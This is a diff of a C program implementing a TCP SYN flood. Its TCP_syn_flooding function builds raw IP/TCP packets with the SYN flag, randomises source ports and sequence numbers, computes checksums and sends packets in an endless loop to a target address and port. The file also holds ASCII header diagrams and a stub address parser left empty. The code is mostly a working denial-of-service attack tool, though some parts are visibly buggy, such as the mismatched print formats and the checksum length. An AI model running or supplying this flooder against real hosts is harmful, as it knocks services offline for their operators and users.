@@ -17,70 +17,64 @@ Update: 2020-05-12T01:42:00+08@China-Guangdong-Zhanjiang+08
 #include <stdlib.h>
 #include <string.h>
 
-#if 0
+/* Header_Format
 
-struct tcphdr {
-	__be16  source;
-	__be16  dest;
-	__be32  seq;
-	__be32  ack_seq;
-#if defined(__LITTLE_ENDIAN_BITFIELD)
-	__u16   res1 : 4,
-		doff : 4,
-		fin : 1,
-		syn : 1,
-		rst : 1,
-		psh : 1,
-		ack : 1,
-		urg : 1,
-		ece : 1,
-		cwr : 1;
-#elif defined(__BIG_ENDIAN_BITFIELD)
-	__u16   doff : 4,
-		res1 : 4,
-		cwr : 1,
-		ece : 1,
-		urg : 1,
-		ack : 1,
-		psh : 1,
-		rst : 1,
-		syn : 1,
-		fin : 1;
-#else
-#error  "Adjust your <asm/byteorder.h> defines"
-#endif
-	__be16  window;
-	__sum16 check;
-	__be16  urg_ptr;
-};
+Pseudo_TCP_Header_Format
 
-#endif
+0                   1                   2                   3
+0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                       Source Address                          |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                    Destination Address                        |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|      zero     |      PTCL     |           TCP Length          |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 
-#if 0
 
-struct iphdr {
-#if defined(__LITTLE_ENDIAN_BITFIELD)
-	__u8    ihl : 4,
-		version : 4;
-#elif defined (__BIG_ENDIAN_BITFIELD)
-	__u8    version : 4,
-		ihl : 4;
-#else
-#error  "Please fix <asm/byteorder.h>"
-#endif
-	__u8    tos;
-	__be16  tot_len;
-	__be16  id;
-	__be16  frag_off;
-	__u8    ttl;
-	__u8    protocol;
-	__sum16 check;
-	__be32  saddr;
-	__be32  daddr;
-	/*The options start here. */
-};
+TCP_Header_Format
 
-#endif
+0                   1                   2                   3
+0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|          Source Port          |       Destination Port        |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                        Sequence Number                        |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                    Acknowledgment Number                      |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|  Data |       |C|E|U|A|P|R|S|F|                               |
+| Offset| Rsrvd |W|C|R|C|S|S|Y|I|            Window             |
+|       |       |R|E|G|K|H|T|N|N|                               |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|           Checksum            |         Urgent Pointer        |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                    Options                    |    Padding    |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                             data                              |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+
+IP_Header_Format
+
+0                   1                   2                   3
+0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|Version|  IHL  |Type of Service|          Total Length         |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|         Identification        |Flags|      Fragment Offset    |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|  Time to Live |    Protocol   |         Header Checksum       |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                       Source Address                          |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                    Destination Address                        |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                    Options                    |    Padding    |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+*/
+
 
 
 bool check(bool failed, const char *file, const int line, const char *function, const int error, const char *message) {
@@ -95,10 +89,26 @@ bool check(bool failed, const char *file, const int line, const char *function, 
 	return failed;
 }
 
+
+typedef const char *State;
+static const struct {
+	const State _Alive;
+	const State _Quit;
+} EType = {
+	._Alive = "Alive",
+	._Quit = "Quit",
+};
+
+static State state;
+
 void sigint(int signo) {
+
 
 }
 
+int ip4_port(char *address, char *ip4, unsigned short *port) {
+
+}
 
 unsigned short checksum(void *data, int length) {
 	unsigned int sum = 0;
@@ -120,61 +130,70 @@ unsigned short checksum(void *data, int length) {
 	return (unsigned short)(~sum);
 }
 
-int TCP_syn_flooding(char *ip, unsigned short port) {
+int TCP_syn_flooding(char *ip4, unsigned short port) {
 	int ret = 0;
 
 	int raw_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
 	struct sockaddr_in target = {
-		.sin_addr.s_addr = inet_addr(ip),
+		.sin_family = AF_INET,
+		.sin_addr.s_addr = inet_addr(ip4),
 		.sin_port = htons(port)
 	};
 
 	/* TCP syn packet */
-	struct {
-		struct iphdr ip;
-		struct tcphdr tcp;
-	} packet;
+	typedef struct {
+		struct iphdr ip;    // 20 byte, tcp header
+		struct tcphdr tcp;  // 20 byte, ip header
+	} Packet;
+
+	Packet packet = {
+		.tcp.source = 0,                     // 16 bit, source port
+		.tcp.dest = target.sin_port,         // 16 bit, destination port
+		.tcp.seq = 0,                        // 32 bit, sequence number
+		.tcp.ack_seq = 0,                    // 32 bit, acknowledgement number
+		.tcp.doff = 5,                       //  4 bit, data offset
+		.tcp.res1 = 0,                       //  4 bit, reserved
+		.tcp.urg = 0,                        //  1 bit, urgent offset valid flag
+		.tcp.ack = 0,                        //  1 bit, acknoledgement field valid flag
+		.tcp.psh = 0,                        //  1 bit, push flag
+		.tcp.rst = 0,                        //  1 bit, reset flag
+		.tcp.syn = 1,                        //  1 bit, synchronize sequence number flag
+		.tcp.fin = 0,                        //  1 bit, finish sending flag
+		.tcp.window = htons(272),            // 16 bit, windows size
+		.tcp.check = 0,                      // 16 bit, checksum
+		.tcp.urg_ptr = 0,                    // 16 bit, urgent offset
+
+		.ip.version = 4,                     //  4 bit, version
+		.ip.ihl = 5,                         //  4 bit, internet header length
+		.ip.tos = 0,                         //  8 bit, type of service
+		.ip.tot_len = htons(sizeof(packet)), // 16 bit, total length
+		.ip.id = getpid(),                   // 16 bit, ID field
+		.ip.frag_off = 0,                    // 16 bit, fragment offset
+		.ip.ttl = 255,                       //  8 bit, time to live
+		.ip.protocol = IPPROTO_TCP,          //  8 bit, protocol
+		.ip.check = 0,                       // 16 bit, checksum
+		.ip.saddr = inet_addr("127.0.0.1"),  // 32 bit, source address
+		.ip.daddr = target.sin_addr.s_addr   // 32 bit, destination address
+	};
 
 	/* for TCP header checksum */
-	struct {
-		unsigned int begin_ip4;
-		unsigned int end_ip4;
-		unsigned char padding;
-		unsigned char protocol;
-		unsigned short length_tcp;
-		struct tcphdr tcp;
-	} pseudo;
+	typedef struct {
+		unsigned int saddr;                  // 32 bit, source address
+		unsigned int daddr;                  // 32 bit, destination address
+		unsigned char zero;                  //  8 bit, bit set to zero
+		unsigned char protocol;              //  8 bit, protocol
+		unsigned short length_tcp;           // 16 bit, TCP length
+		struct tcphdr tcp;                   // 20 byte, TCP header
+	} Pseudo;
 
-
-	// 20 bit, tcp header
-	packet.tcp.source = 0;                     // 16 bit, source port
-	packet.tcp.dest = target.sin_port;         // 16 bit, destination port
-	packet.tcp.seq = 0;                        // 32 bit, sequence number
-	packet.tcp.ack_seq = 0;                    // 32 bit, acknowledgement number
-	packet.tcp.doff = 5;                       //  4 bit, data offset
-	packet.tcp.res1 = 0;                       //  4 bit, reserved
-	packet.tcp.urg = 0;                        //  1 bit, urgent offset valid flag
-	packet.tcp.ack = 0;                        //  1 bit, acknoledgement field valid flag
-	packet.tcp.psh = 0;                        //  1 bit, push flag
-	packet.tcp.rst = 0;                        //  1 bit, reset flag
-	packet.tcp.syn = 1;                        //  1 bit, synchronize sequence number flag
-	packet.tcp.fin = 0;                        //  1 bit, finish sending flag
-	packet.tcp.window = htons(242);            // 16 bit, windows size
-	packet.tcp.check = 0;                      // 16 bit, checksum
-	packet.tcp.urg_ptr = 0;                    // 16 bit, urgent offset
-
-	// 20 bit, ip header
-	packet.ip.version = 4;                     //  4 bit, version
-	packet.ip.ihl = 5;                         //  4 bit, internet header length
-	packet.ip.tos = 0;                         //  8 bit, type of service
-	packet.ip.tot_len = htons(sizeof(packet)); // 16 bit, total length
-	packet.ip.id = getpid();                   // 16 bit, ID field
-	packet.ip.frag_off = 0;                    // 16 bit, fragment offset
-	packet.ip.ttl = 255;                       //  8 bit, time to live
-	packet.ip.protocol = IPPROTO_TCP;          //  8 bit, protocol
-	packet.ip.check = 0;                       // 16 bit, checksum
-	packet.ip.saddr = 0;                       // 32 bit, source address
-	packet.ip.daddr = target.sin_addr.s_addr;  // 32 bit, destination address
+	Pseudo pseudo = {
+		.saddr = packet.ip.saddr,
+		.daddr = packet.ip.daddr,
+		.zero = 0,
+		.protocol = packet.ip.protocol,
+		.length_tcp = htons(sizeof(packet.tcp)),
+		.tcp = packet.tcp
+	};
 
 
 	while (true) {
@@ -182,29 +201,37 @@ int TCP_syn_flooding(char *ip, unsigned short port) {
 		packet.ip.check = 0;
 		packet.ip.check = checksum(&packet.ip, sizeof(packet.ip));
 
-		packet.tcp.source = htons(rand());    // htons(1025 + rand() % 60000);
-		packet.tcp.seq = htonl(rand());       // 761013 + rand() % 100000;
+		packet.tcp.source = htons(rand());
+		packet.tcp.seq = htonl(rand());
 		packet.tcp.check = 0;
-		pseudo.begin_ip4 = packet.ip.saddr;
-		pseudo.end_ip4 = packet.ip.daddr;
-		pseudo.padding = 0;
-		pseudo.protocol = IPPROTO_TCP;
-		pseudo.length_tcp = htons(sizeof(packet.tcp));
+		pseudo.saddr = packet.ip.saddr;
 		pseudo.tcp = packet.tcp;
 		packet.tcp.check = checksum(&pseudo, sizeof(packet));
 
+		fprintf(stderr, "%s:%d ==>> %s:%d \n", packet.ip.saddr, packet.tcp.source, packet.ip.daddr, packet.tcp.dest);
 		sendto(raw_fd, &packet, sizeof(packet), 0, (struct sockaddr *)&target, sizeof(target));
 		ret += 1;
+
+		usleep(500 * 1000);
 	}
 
 	return ret;
 }
 
 int main(int argc, char *argv[]) {
-	char *ip = "192.168.12.160";
+	if (argc < 2) {
+		fprintf(stderr, "[Usage] %s ip4:port \n", argv[0]);
+	}
+
+	state = EType._Alive;
+
+	char ip4[64] = "192.168.12.160";
 	unsigned port = 80;
 
-	TCP_syn_flooding(ip, port);
+	ip4_port(argv[1], ip4, &port);
+	fprintf(stderr, "%s:%d\n", ip4, port);
+
+	TCP_syn_flooding(ip4, port);
 
 	return 0;
 }
